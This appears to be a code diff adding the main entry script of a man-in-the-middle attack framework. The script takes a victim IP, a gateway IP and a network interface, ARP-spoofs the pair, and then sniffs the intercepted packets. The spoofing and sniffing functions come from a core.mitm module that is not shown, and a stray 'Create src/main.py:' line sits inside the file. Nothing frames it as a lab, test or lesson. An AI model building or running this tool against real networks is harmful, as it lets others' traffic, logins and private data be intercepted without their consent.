@@ -1,0 +1,21 @@
+Create src/main.py:
+from core.mitm import MITMFramework
+import argparse
+
+def main():
+    parser = argparse.ArgumentParser(description="MITM Framework")
+    parser.add_argument("-t", "--target", help="Target IP address", required=True)
+    parser.add_argument("-g", "--gateway", help="Gateway IP address", required=True)
+    parser.add_argument("-i", "--interface", help="Network interface", required=True)
+    
+    args = parser.parse_args()
+    
+    mitm = MITMFramework()
+    if mitm.arp_spoof(args.target, args.gateway, args.interface):
+        try:
+            mitm.sniff_packets(args.interface)
+        except KeyboardInterrupt:
+            print("\n[!] Stopping MITM attack")
+            
+if __name__ == "__main__":
+    main()
